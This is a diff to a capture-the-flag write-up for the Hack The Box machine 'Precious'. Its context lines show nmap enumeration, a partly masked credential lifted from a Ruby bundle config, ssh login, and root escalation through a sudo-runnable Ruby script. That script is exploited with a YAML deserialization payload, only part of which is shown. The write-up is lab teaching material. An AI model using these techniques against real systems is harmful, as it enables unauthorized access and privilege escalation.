@@ -9,7 +9,8 @@ categories: writeups
 {% assign image_path = site.data.categories[0].image_path %}
 # Enumeration
 
-``` shell
+``` 
+$ nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189
 # Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189
 Warning: 10.10.11.189 giving up on port because retransmission cap hit (10).
 Nmap scan report for precious.htb (10.10.11.189)
@@ -48,7 +49,7 @@ I entered my VPN network interface IP address `http://10.10.14.4`, and what do y
 
 # Initial Access
 Now that I had something new to work with, I wanted to know more about the generated file. I downloaded the file and ran a common file forensics tool called `exiftool` on it.
-```shell
+```
 $ exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
 
 ExifTool Version Number         : 12.52
@@ -107,7 +108,7 @@ And there was my shell.
 
 # Privilege Escalation
 I had access to the machine, but I was user `ruby`. The first thing I do after initial access to a machine is look at the obvious such as the contents of files (including hidden files).
-```shell
+```
 $ ls -lah
 total 36K
 drwxr-xr-x 6 root root 4.0K Oct 26  2022 .
@@ -121,7 +122,7 @@ drwxrwxr-x 2 root ruby 4.0K Sep 26 15:54 pdf
 drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 public
 ```
 The directory I landed in didn't seem to be a home directory. Instead, I was in `/var/www/pdfapp`. After some digging in that directory, I looked into `ruby`'s home directory.
-```shell
+```
 $ ls -lah
 total 28K
 drwxr-xr-x 4 ruby ruby 4.0K Sep 24 22:04 .
@@ -140,13 +141,13 @@ $ cat config
 BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1Aq......aXAYFH"
 ```
 `henry` existed on the machine, so I attempted to login using `ssh`.
-```shell
+```
 $ ssh henry@10.10.11.189
 ```
 The credentials were valid, and I logged in as `henry`.
 
 From here, the next and last step was escalating to `root`. After some looking around, I wasn't able to find much. I tried running `sudo -l`, which would reveal binaries explicitly enabled for my user to run as root, also known as an SUID.
-``` shell
+``` 
 henry@precious:~$ sudo -l
 Matching Defaults entries for henry on precious:
     env_reset, mail_badpass,
@@ -190,7 +191,7 @@ gems_file.each do |file_name, file_version|
 end
 ```
 Well this certainly didn't look fun. I don't know anything about `ruby`, much less how to read it. But the thing is, I didn't need to know how to read it. I attempted to run the command and received the following output.
-```shell
+```
 henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 Traceback (most recent call last):
         2: from /opt/update_dependencies.rb:17:in `<main>'
@@ -198,7 +199,7 @@ Traceback (most recent call last):
 /opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
 ```
 Having looked at the source code and previewing the command output, something that already stood out to me was that it was loading/reading a file called `dependencies.yml`. Furthermore, I wasn't sure exactly where it was looking for this `dependencies.yml`. Perhaps it could possibly be looking for it locally? I created a local file in my home directory of the script and tried running the command again.
-```shell
+```
 henry@precious:~$ touch dependencies.yml
 henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 Traceback (most recent call last):
@@ -229,7 +230,7 @@ Awesome! To summarize the blog post, it looked like the author was accomplishing
               git_set: id
           method_id: :resolve
 ```
-```shell
+```
 henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
 uid=0(root) gid=0(root) groups=0(root)
@@ -240,7 +241,7 @@ Traceback (most recent call last):
 Nice, I had RCE as `root`! To recall, I knew I could run the script as `root` after running `sudo -l`. Then, I accomplished RCE through the file `dependencies.yml` that was being loaded in the `update_dependencies.rb` script by deserialization.
 
 The last step was to run a shell command that would make me `root`. A quick way to do this was setting the command to `su`, which would change my user to `root`.
-```shell
+```
 henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
 root@precious:/home/henry#
